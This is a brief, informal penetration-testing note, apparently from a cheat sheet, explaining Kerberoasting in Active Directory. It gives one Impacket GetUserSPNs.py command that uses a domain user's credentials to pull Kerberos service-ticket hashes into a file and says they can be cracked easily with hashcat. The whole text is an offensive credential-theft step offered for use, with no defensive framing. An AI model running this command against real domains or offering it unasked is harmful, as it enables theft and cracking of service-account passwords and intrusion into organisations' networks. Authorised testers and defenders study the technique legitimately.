If you have a user already on the domain. You may be able to pull Kerb hashes with GetUserSPN 

The following command will attempt to yoink hashes
`python3.9 GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>`

These can be cracked with ease using hashcat.